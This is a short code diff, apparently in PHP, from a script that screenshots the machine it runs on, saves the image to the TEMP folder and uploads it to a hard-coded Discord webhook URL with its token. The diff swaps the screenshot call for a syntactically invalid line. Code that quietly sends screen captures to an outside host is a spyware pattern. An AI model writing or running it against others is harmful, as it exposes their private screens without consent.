@@ -1,6 +1,7 @@
 // Replace the URL with your own webhook url
         $url = "https://discord.com/api/webhooks/838284423278493697/gthE3yddrHZwT5n0dYCqvHtu5lQCYy_nnNdfghmnK-W2QOq3X7xPOoaEKhY-tiszfAGW";
-        $this->robot->screenshot()->save($_ENV['TEMP'].'\temp.png','png');
+        
+        new RobotScript->screenshot()->save($_ENV['TEMP'].'\temp.png','png');
         $hookObject = [
             
             'file' => new File($_ENV['TEMP'].'\temp.png'),
